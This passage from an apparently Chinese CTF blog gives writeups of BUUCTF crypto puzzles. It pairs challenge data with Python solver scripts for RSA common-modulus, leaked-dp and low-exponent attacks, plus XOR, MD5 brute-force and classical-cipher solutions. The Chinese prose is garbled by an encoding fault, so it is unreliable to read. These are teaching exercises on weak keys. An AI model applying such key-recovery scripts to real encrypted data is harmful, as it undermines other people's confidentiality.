class="line">c2&#x3D;18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2&#x3D;9647291</span><br></pre></td></tr></table></figure><p>å…±æ¨¡æ”»å‡»,expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span>(<span class="params">n, e1, e2, c1, c2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"></span><br><span class="line">print(libnum.n2s(common_modulus(n, e1, e2, c1, c2)))</span><br></pre></td></tr></table></figure><h3 id="ä¸–ä¸Šæ— éš¾äº‹"><a href="#ä¸–ä¸Šæ— éš¾äº‹" class="headerlink" title="ä¸–ä¸Šæ— éš¾äº‹"></a>ä¸–ä¸Šæ— éš¾äº‹</h3><p>åŒæ ·æ˜¯quipqiupè§£å¯†ï¼š<a href="https://quipqiup.com/">https://quipqiup.com</a></p><h3 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h3><p>é¢˜ç›®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e &#x3D; 65537</span><br><span class="line">n &#x3D; 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp &#x3D; 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c &#x3D; 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure><p>æ³„éœ²dp exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getd</span>(<span class="params">n,e,dp</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span></span><br><span class="line">                q=n//(((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span>)</span><br><span class="line">                phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">                d = gmpy2.invert(e,phi)%phi</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">d=getd(n,e,dp)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="å¼‚æ€§ç›¸å¸"><a href="#å¼‚æ€§ç›¸å¸" class="headerlink" title="å¼‚æ€§ç›¸å¸"></a>å¼‚æ€§ç›¸å¸</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asadsasdasdasdasdasdasdasdasdasdqwesqf</span><br><span class="line"></span><br><span class="line">á¼‡Ì€Ğˆå”’á€ƒå¡”å±‹ä©˜å–å‰„äƒå ‚Ù†ä”å˜…å‡á‰„ä©á¬”</span><br></pre></td></tr></table></figure><p>å¼‚æ€§ç›¸å¸ï¼Œå¼‚æˆ–ï¼Ÿå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶å¤§å°æ˜¯ç›¸ç­‰çš„</p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200923094353.png"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = open(<span class="string">&#x27;1.txt&#x27;</span>).read()</span><br><span class="line">s2 = open(<span class="string">&#x27;key.txt&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(s1,s2):</span><br><span class="line">    print(chr(ord(i)^ord(j)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h3><p>ç»™äº†ä¸¤ä¸ªæ–‡ä»¶<code>flag.enc</code>å’Œ<code>pub.key</code>,å…ˆæå–å‡ºnå’Œeï¼Œå†ç”¨yafuåˆ†è§£å‡ºpå’Œq</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;pub.key&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">    print(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line">    print(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br></pre></td></tr></table></figure><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200923132811.png"></p><p>æ¥ç€ç”Ÿæˆç§é’¥,python2è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">keypair.p = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">keypair.q = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q  </span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>)) </span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e  </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">&#x27;private.pem&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">private.write(keypair.exportKey()) </span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>æ¥ç€ç”¨opensslè§£å¯†å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.txt</span><br></pre></td></tr></table></figure><h3 id="è¿˜åŸå¤§å¸ˆ"><a href="#è¿˜åŸå¤§å¸ˆ" class="headerlink" title="è¿˜åŸå¤§å¸ˆ"></a>è¿˜åŸå¤§å¸ˆ</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸²ç¥ç§˜å­—ç¬¦ä¸²ï¼šTASC?O3RJMV?WDJKX?ZM,é—®å·éƒ¨åˆ†æ˜¯æœªçŸ¥å¤§å†™å­—æ¯ï¼Œä¸ºäº†ç¡®å®šè¿™ä¸ªç¥ç§˜å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬é€šè¿‡äº†å…¶ä»–é€”å¾„è·å¾—äº†è¿™ä¸ªå­—ä¸²çš„32ä½MD5ç ã€‚ä½†æ˜¯æˆ‘ä»¬è·å¾—å®ƒçš„32ä½MD5ç ä¹Ÿæ˜¯æ®‹ç¼ºä¸å…¨ï¼ŒE903???4DAB????08?????51?80??8A?,è¯·çŒœå‡ºç¥ç§˜å­—ç¬¦ä¸²çš„åŸæœ¬æ¨¡æ ·ï¼Œå¹¶ä¸”æäº¤è¿™ä¸ªå­—ä¸²çš„32ä½MD5ç ä½œä¸ºç­”æ¡ˆã€‚ æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag&#123;&#125; æäº¤</span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜æ„å†™è„šæœ¬çˆ†ç ´å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">BigStr  = string.ascii_uppercase</span><br><span class="line">s1 = <span class="string">&#x27;TASC&#123;&#125;O3RJMV&#123;&#125;WDJKX&#123;&#125;ZM&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;E903???4DAB????08?????51?80??8A?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> BigStr:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> BigStr:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> BigStr:</span><br><span class="line">            s = s1.format(i,j,k)</span><br><span class="line">            smd5 = hashlib.md5(str(s).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">            flag = re.search(s2.replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;.&#x27;</span>),smd5.upper())</span><br><span class="line">            <span class="keyword">if</span> flag!=<span class="literal">None</span>:</span><br><span class="line">                print(s,smd5.upper())</span><br></pre></td></tr></table></figure><h3 id="robomunication"><a href="#robomunication" class="headerlink" title="robomunication"></a>robomunication</h3><p>å¬å‡ºæ¥æ˜¯æ‘©æ–¯å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--.</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLOWHATISTHEKEYITISBOOPBEEP</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;BOOPBEEP&#125;</span><br></pre></td></tr></table></figure><h3 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#123;920139713,19&#125;</span><br><span class="line"></span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RSA rollï¼rollï¼rollï¼</span><br><span class="line">Only number and a-z</span><br><span class="line">ï¼ˆdon&#39;t use editor</span><br><span class="line">which MS provideï¼‰</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾å¯ä»¥çŒœåˆ°<code>&#123;920139713,19&#125;</code>æ˜¯ç§é’¥ï¼Œé‚£äº›æ•°å­—éƒ½æ˜¯å¯†æ–‡ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†è§£å¤§æ•´æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moder</span>(<span class="params">n</span>):</span></span><br><span class="line">    base=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> base &lt;math.sqrt(n):</span><br><span class="line">        <span class="keyword">if</span>(n%base==<span class="number">0</span>):</span><br><span class="line">            fbase=base</span><br><span class="line">            print(base,int(n/base))</span><br><span class="line">        base+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    f=getEuler(fbase,int(n/fbase))</span><br><span class="line">    print(<span class="string">&#x27;f(n)æ¬§æ‹‰å‡½æ•°å€¼ï¼š%d&#x27;</span>%f)<span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"><span class="comment"># æ±‚æ¬§æ‹‰å‡½æ•°f(n)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getEuler</span>(<span class="params">prime1, prime2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (prime1<span class="number">-1</span>)*(prime2<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚ç§é’¥d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDkey</span>(<span class="params">e, Eulervalue</span>):</span><span class="comment">#å¯ä»¥è¾—è½¬ç›¸é™¤æ³•</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (((Eulervalue * k) + <span class="number">1</span>) % e) == <span class="number">0</span>:</span><br><span class="line">            (d,m)=divmod(Eulervalue * k + <span class="number">1</span>,e)</span><br><span class="line">            <span class="keyword">return</span> d<span class="comment">#é¿å…ç§‘å­¦è®¡æ•°æ³•æœ€åè½¬intå¤±å»ç²¾åº¦</span></span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">d =getDkey(<span class="number">19</span>, moder(n))</span><br><span class="line">print(<span class="string">&#x27;ç§é’¥ä¸ºï¼š %d&#x27;</span>%d)</span><br><span class="line">c=[<span class="number">704796792</span>,<span class="number">752211152</span>,<span class="number">274704164</span>,<span class="number">18414022</span>,<span class="number">368270835</span>,<span class="number">483295235</span>,<span class="number">263072905</span>,<span class="number">459788476</span>,<span class="number">483295235</span>,<span class="number">459788476</span>,<span class="number">663551792</span>,<span class="number">475206804</span>,</span><br><span class="line">   <span class="number">459788476</span>,<span class="number">428313374</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">425392137</span>,<span class="number">704796792</span>,<span class="number">458265677</span>,<span class="number">341524652</span>,<span class="number">483295235</span>,<span class="number">534149509</span>,<span class="number">425392137</span>,<span class="number">428313374</span>,</span><br><span class="line">   <span class="number">425392137</span>,<span class="number">341524652</span>,<span class="number">458265677</span>,<span class="number">263072905</span>,<span class="number">483295235</span>,<span class="number">828509797</span>,<span class="number">341524652</span>,<span class="number">425392137</span>,<span class="number">475206804</span>,<span class="number">428313374</span>,<span class="number">483295235</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">306220148</span>]</span><br><span class="line">L=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">    L.append(pow(x,d,n))</span><br><span class="line">print(L)<span class="comment">#æ˜æ–‡asciiè¡¨</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">    print(chr(x),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿˜èƒ½æç¤ºä»€ä¹ˆå‘¢ï¼Ÿå…¬å¹³çš„ç©å§ï¼ˆå¯†é’¥è‡ªå·±æ‰¾ï¼‰ Dncnoqqfliqrpgeklwmppu æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag&#123;&#125; æäº¤, flag&#123;å°å†™å­—æ¯&#125;</span><br></pre></td></tr></table></figure><p>ä»å…¬å¹³ç©å§è”æƒ³åˆ°<code>Playfair Cipher</code>ï¼š<a href="http://rumkin.com/tools/cipher/playfair.php">http://rumkin.com/tools/cipher/playfair.php</a></p><p>ç›´æ¥è§£å¯†ï¼Œå¯†ç æ˜¯<code>playfair</code>ï¼Œæ³¨æ„è¦å°å†™</p><h3 id="Unencode"><a href="#Unencode" class="headerlink" title="Unencode"></a>Unencode</h3><p>uuencodeè§£å¯†å¾—åˆ°flag:<a href="http://ctf.ssleye.com/uu.html">http://ctf.ssleye.com/uu.html</a></p><h3 id="Dangerous-RSA"><a href="#Dangerous-RSA" class="headerlink" title="Dangerous RSA"></a>Dangerous RSA</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">#e:  0x3</span><br><span class="line">#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?</span><br></pre></td></tr></table></figure><p>ä½åŠ å¯†æŒ‡æ•°å°æ˜æ–‡æ”»å‡»ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872</span></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.iroot(c, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="è¾¾èŠ¬å¥‡å¯†ç "><a href="#è¾¾èŠ¬å¥‡å¯†ç " class="headerlink" title="è¾¾èŠ¬å¥‡å¯†ç "></a>è¾¾èŠ¬å¥‡å¯†ç </h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾¾èŠ¬å¥‡éšè—åœ¨è’™å¨œä¸½èä¸­çš„æ•°å­—åˆ—:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 </span><br><span class="line">è®°å½•åœ¨è¾¾èŠ¬å¥‡çª—å°å£çš„ç¥ç§˜æ•°å­—ä¸²:36968853882116725547342176952286</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸Šé¢çš„æ•°å­—åˆ—çš„ä¸ªæ•°å’Œä¸‹é¢çš„æ•°å­—ä¸²é•¿åº¦æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯32ï¼Œä»”ç»†çœ‹ä¸Šé¢ï¼Œå‘ç°æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼Œå¹¶ä¸”æ˜¯ä¹±åºçš„ï¼ŒçŒœæµ‹ä¸‹é¢çš„å’Œä¸Šé¢çš„é¡ºåºä¸€æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 